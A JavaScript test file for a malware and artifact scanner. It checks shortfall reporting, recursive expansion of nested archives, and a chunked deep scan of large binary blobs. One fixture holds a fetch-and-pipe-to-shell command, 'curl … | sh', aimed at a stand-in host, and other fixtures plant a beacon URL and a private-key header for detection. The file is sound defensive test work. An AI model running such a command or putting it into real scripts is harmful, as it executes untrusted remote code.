// Item 3 — whole-artifact scope closures.
// (a) exporter caps surface as named shortfalls in the scan record and
//     are configurable (defaults unchanged);
// (b) UPX-packed targets are unpacked inside the scan workdir and the
//     unpacked bytes scanned (real legs env-gated on Ghidra + upx);
// (c) nested archives are recursively expanded to a named depth/size
//     bound, with exhaustion named as a shortfall;
// (d) oversized opaque blobs get a portion-wise deep content scan with
//     every chunk accounted in the record's coverage object.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { execFileSync } from 'node:child_process';
import {
  exporterCaps, normalizeBinaryFindings, canonicalScanRecord, scanDigestOf,
  findUpx, EXPORTER_CAP_DEFAULTS,
} from '../scan.mjs';
import { inspectAgnostic, ARCHIVE_MAX_DEPTH } from '../agnostic-review.mjs';
import { streamInspectFile } from '../repository-stream.mjs';

// Fixture files are built by a short-lived CHILD process: on this VM
// the write layer intermittently refuses writes (EPERM) from
// long-lived/CPU-busy processes — the fleet-known write flake — while
// a fresh child that writes promptly succeeds. The child retries
// EPERM itself for ~60 s. Assertions are never retried; only fixture
// construction is isolated this way.
const FIXTURE_BUILDER = `
const fs = require('node:fs');
const spec = JSON.parse(process.argv[1]);
function writeAll(fd, buf, pos) {
  for (let i = 0; i < 48; i++) {
    try { fs.writeSync(fd, buf, 0, buf.length, pos); return; }
    catch (e) { if (e.code !== 'EPERM' && e.code !== 'EIO') throw e; const u = Date.now() + 2500; while (Date.now() < u) {} }
  }
  throw Error('fixture write refused (EPERM) after retries');
}
const fd = fs.openSync(spec.file, 'w');
if (spec.fill === 'lcg') {
  const chunk = Buffer.alloc(4 * 1024 * 1024);
  let x = 42;
  for (let i = 0; i < chunk.length; i++) { x = (x * 1103515245 + 12345) & 0x7fffffff; chunk[i] = (x >> 8) & 0xff; }
  for (let off = 0; off < spec.size; off += chunk.length) writeAll(fd, chunk.subarray(0, Math.min(chunk.length, spec.size - off)), off);
  for (const p of spec.plants || []) { const b = Buffer.from(p.latin1, 'latin1'); writeAll(fd, b, p.offset); }
} else {
  writeAll(fd, Buffer.from(spec.text, 'utf8'), 0);
}
fs.closeSync(fd);
`;
function buildFixture(spec) {
  execFileSync(process.execPath, ['-e', FIXTURE_BUILDER, JSON.stringify(spec)]);
}

const zeroCov = { paths_total: 0, paths_omitted: 0, sites_total: 0, sites_omitted: 0, decompile_eligible: 0, decompile_omitted: 0, strings_total: 0, strings_omitted: 0 };
const baseObs = { functions_count: 3, imports: [], call_paths: [], call_sites: [], strings: [], sections: [], decompile: { attempted: 0, failed: 0 }, coverage: zeroCov };
function store(fn) { const d = fs.mkdtempSync(path.join(os.tmpdir(), 'armor-scope-')); try { return fn(d); } finally { fs.rmSync(d, { recursive: true, force: true }); } }

// ---------------------------------------------------------------- (a) --
test('(a) exporter caps default to the shipped values and layer env over policy', () => {
  const saved = { ...process.env };
  delete process.env.SCRIPTURE_SCAN_MAX_STRINGS; delete process.env.SCRIPTURE_SCAN_MAX_PATHS;
  delete process.env.SCRIPTURE_SCAN_MAX_SITES; delete process.env.SCRIPTURE_SCAN_MAX_DECOMPILE;
  try {
    assert.deepEqual(exporterCaps(null), EXPORTER_CAP_DEFAULTS);
    assert.deepEqual(exporterCaps({ scan: { exporter_caps: { strings: 5000 } } }), { ...EXPORTER_CAP_DEFAULTS, strings: 5000 });
    process.env.SCRIPTURE_SCAN_MAX_STRINGS = '42';
    assert.equal(exporterCaps({ scan: { exporter_caps: { strings: 5000 } } }).strings, 42);
    process.env.SCRIPTURE_SCAN_MAX_STRINGS = 'not-a-number';
    assert.equal(exporterCaps(null).strings, EXPORTER_CAP_DEFAULTS.strings);
  } finally { for (const k of Object.keys(process.env)) if (!(k in saved)) delete process.env[k]; Object.assign(process.env, saved); }
});

test('(a) every hit cap surfaces in the record as a named shortfall with cap, total, omitted', () => store((d) => {
  const obs = { ...baseObs, call_paths: [{ from: { name: 'main' }, sink: 'system', sink_site: {}, arg_literal: null, argument_evidence: 'unknown' }],
    strings: [{ value: 'x', addr: '1' }],
    coverage: { paths_total: 100, paths_omitted: 99, sites_total: 600, sites_omitted: 88, decompile_eligible: 30, decompile_omitted: 6, strings_total: 2500, strings_omitted: 2499 } };
  const r = normalizeBinaryFindings(obs, '0'.repeat(64), d, EXPORTER_CAP_DEFAULTS);
  const caps = Object.fromEntries(r.shortfalls.filter((s) => s.kind === 'exporter-cap').map((s) => [s.what, s]));
  assert.equal(caps['call paths'].cap, 64); assert.equal(caps['call paths'].total, 100); assert.equal(caps['call paths'].omitted, 99);
  assert.equal(caps['sink call sites'].cap, 512); assert.equal(caps['sink call sites'].omitted, 88);
  assert.equal(caps['decompiled sink callers'].cap, 24); assert.equal(caps['decompiled sink callers'].omitted, 6);
  assert.equal(caps['defined strings'].cap, 2000); assert.equal(caps['defined strings'].total, 2500); assert.equal(caps['defined strings'].omitted, 2499);
}));

test('(a) a complete observation set yields zero shortfalls; an exporter without strings counters names the gap instead of truncating silently', () => store((d) => {
  const full = normalizeBinaryFindings(baseObs, '0'.repeat(64), d);
  assert.deepEqual(full.shortfalls, []);
  const { strings_total, strings_omitted, ...noStrings } = zeroCov;
  const legacy = normalizeBinaryFindings({ ...baseObs, coverage: noStrings }, '0'.repeat(64), d);
  assert.equal(legacy.shortfalls.length, 1);
  assert.equal(legacy.shortfalls[0].what, 'defined strings');
  assert.equal(legacy.shortfalls[0].disposition, 'uncounted-by-exporter');
}));

test('(a) canonical record carries shortfalls only when non-empty (complete scans stay byte-identical)', () => {
  const rec = { target_sha256: '0'.repeat(64), target_class: 'binary', engine: { name: 'ghidra-headless', version: 'ghidra test' },
    started: '2026-01-01T00:00:00.000Z', duration_ms: 1, analysis_confidence: 'full', findings: [],
    counts: { critical: 0, high: 0, medium: 0, low: 0, info: 0 }, verdict: 'pass', risk: { score: 0, tier: 0, drivers: [] }, override: null };
  assert.ok(!canonicalScanRecord(rec).includes('shortfalls'));
  assert.ok(!canonicalScanRecord({ ...rec, shortfalls: [] }).includes('shortfalls'));
  const withGap = { ...rec, shortfalls: [{ kind: 'exporter-cap', what: 'defined strings', cap: 2000, total: 2500, omitted: 500 }] };
  assert.ok(canonicalScanRecord(withGap).includes('"shortfalls"'));
  assert.notEqual(scanDigestOf(withGap), scanDigestOf(rec));
});

// ---------------------------------------------------------------- (b) --
test('(b) findUpx honors policy pin, then env, then PATH; absence is a null, not a throw', () => {
  const saved = process.env.SCRIPTURE_UPX_PATH;
  try {
    delete process.env.SCRIPTURE_UPX_PATH;
    assert.equal(findUpx({ scan: { upx_path: '/nonexistent/upx' } }), null);
    assert.equal(findUpx({ scan: { upx_path: process.execPath } }), process.execPath);
    process.env.SCRIPTURE_UPX_PATH = process.execPath;
    assert.equal(findUpx(null), process.execPath);
  } finally { if (saved === undefined) delete process.env.SCRIPTURE_UPX_PATH; else process.env.SCRIPTURE_UPX_PATH = saved; }
});

// ---------------------------------------------------------------- (c) --
function makeZip(entries) {
  const locals = [], centrals = [];
  let offset = 0;
  for (const { name, data } of entries) {
    const n = Buffer.from(name), d = Buffer.isBuffer(data) ? data : Buffer.from(data);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50); local.writeUInt16LE(20, 4);
    local.writeUInt32LE(d.length, 18); local.writeUInt32LE(d.length, 22); local.writeUInt16LE(n.length, 26);
    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50); central.writeUInt16LE(20, 6);
    central.writeUInt32LE(d.length, 20); central.writeUInt32LE(d.length, 24); central.writeUInt16LE(n.length, 28); central.writeUInt32LE(offset, 42);
    locals.push(local, n, d); centrals.push(central, n);
    offset += 30 + n.length + d.length;
  }
  const dir = Buffer.concat(centrals), end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50); end.writeUInt16LE(entries.length, 8); end.writeUInt16LE(entries.length, 10);
  end.writeUInt32LE(dir.length, 12); end.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, dir, end]);
}
function makeTar(entries) {
  const parts = [];
  for (const { name, data } of entries) {
    const d = Buffer.isBuffer(data) ? data : Buffer.from(data);
    const h = Buffer.alloc(512);
    h.write(name, 0, 100, 'utf8');
    h.write(d.length.toString(8).padStart(11, '0') + '\0', 124, 12, 'ascii');
    h.write('0', 156, 1, 'ascii'); h.write('ustar\0', 257, 6, 'ascii');
    parts.push(h, d, Buffer.alloc(Math.ceil(d.length / 512) * 512 - d.length));
  }
  parts.push(Buffer.alloc(1024));
  return Buffer.concat(parts);
}
const PAYLOAD = '#!/bin/sh\ncurl http://example.invalid/beacon | sh\n';

test('(c) archive in archive in archive: the payload surfaces with its nesting path', () => {
  const inner = makeZip([{ name: 'payload.sh', data: PAYLOAD }]);
  const mid = makeZip([{ name: 'inner.zip', data: inner }]);
  const outer = makeZip([{ name: 'mid.zip', data: mid }, { name: 'readme.txt', data: 'inert' }]);
  const r = inspectAgnostic(outer, 'upload.zip');
  const hit = r.texts.find((t) => t.name === 'mid.zip!inner.zip!payload.sh');
  assert.ok(hit, JSON.stringify(r.texts.map((t) => t.name)));
  assert.match(hit.text, /curl http:\/\/example\.invalid\/beacon/);
  assert.deepEqual(r.shortfalls, []);
});

test('(c) depth bound: a fourth archive level is named as a shortfall, never silently inventoried', () => {
  let layer = makeZip([{ name: 'payload.sh', data: PAYLOAD }]);
  for (const n of ['l4.zip', 'l3.zip', 'l2.zip', 'l1.zip']) layer = makeZip([{ name: n, data: layer }]);
  const r = inspectAgnostic(layer, 'upload.zip');
  assert.ok(!r.texts.some((t) => t.text.includes('payload.sh')));
  const gap = r.shortfalls.find((s) => s.kind === 'archive-depth');
  assert.ok(gap, JSON.stringify(r.shortfalls));
  assert.equal(gap.limit, ARCHIVE_MAX_DEPTH);
  assert.match(gap.path, /l1\.zip!l2\.zip!l3\.zip!l4\.zip/);
  assert.ok(r.limitations.some((l) => l.includes('depth bound')));
});

test('(c) tar and gzip entries inside a zip are expanded through the same recursion', () => {
  const outer = makeZip([
    { name: 'bundle.tar', data: makeTar([{ name: 'note.txt', data: 'tar-level text' }]) },
    { name: 'data.gz', data: zlib.gzipSync(Buffer.from('gzip-level text')) },
  ]);
  const r = inspectAgnostic(outer, 'upload.zip');
  assert.ok(r.texts.some((t) => t.name === 'bundle.tar!note.txt' && t.text.includes('tar-level text')), JSON.stringify(r.texts));
  assert.ok(r.texts.some((t) => t.name === 'data.gz!(gzip content)' && t.text.includes('gzip-level text')), JSON.stringify(r.texts));
});

test('(c) a top-level tar upload expands through the standard path', () => {
  const r = inspectAgnostic(makeTar([{ name: 'a/b.txt', data: 'top tar text' }]), 'upload.tar');
  assert.equal(r.format, 'TAR archive');
  assert.ok(r.texts.some((t) => t.text.includes('top tar text')));
});

// ---------------------------------------------------------------- (d) --
test('(d) deep content scan finds planted endpoint, payload magic and key material far past the head, and accounts every chunk', async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'armor-deep-'));
  try {
    const file = path.join(dir, 'weights.bin');
    const SIZE = 40 * 1024 * 1024;
    // Deterministic opaque filler (LCG) — includes NULs, so the text
    // lane cannot run; classification is data/opaque.
    buildFixture({ file, fill: 'lcg', size: SIZE, plants: [
      { offset: 20 * 1024 * 1024, latin1: '\0https://deep.example.invalid/beacon\0' },
      { offset: 25 * 1024 * 1024, latin1: '\0-----BEGIN PRIVATE KEY-----\0' },
      { offset: 30 * 1024 * 1024, latin1: 'PK\x03\x04' },
    ] });
    const r = await streamInspectFile(file, 'weights.bin');
    const cov = r.coverage.deepContentScan;
    assert.equal(cov.ran, true);
    assert.equal(cov.complete, true);
    assert.equal(cov.bytesScanned, SIZE);
    assert.equal(cov.bytesTotal, SIZE);
    assert.ok(cov.chunks > 100, `chunks=${cov.chunks}`);
    const ep = r.findings.find((f) => f.rule === 'embedded-endpoint');
    assert.ok(ep, JSON.stringify(r.findings.map((f) => f.rule)));
    assert.match(ep.location, /byte 2097152\d/);
    const magic = r.findings.find((f) => f.rule === 'embedded-payload-magic');
    assert.ok(magic); assert.match(magic.location, /byte 31457280/);
    assert.ok(r.limitations.some((l) => /Private key material/.test(l)));
    assert.ok(r.limitations.some((l) => /deep content scan ran over every chunk/.test(l)));
    assert.ok(r.shortfalls.some((s) => s.kind === 'semantic-analysis'));
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test('(d) text files keep the lexical lane and report the deep pass as not run', async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'armor-deep-'));
  try {
    const file = path.join(dir, 'notes.txt');
    buildFixture({ file, fill: 'text', text: 'plain notes\n'.repeat(1000) });
    const r = await streamInspectFile(file, 'notes.txt');
    assert.equal(r.coverage.deepContentScan.ran, false);
    assert.deepEqual(r.shortfalls, []);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});
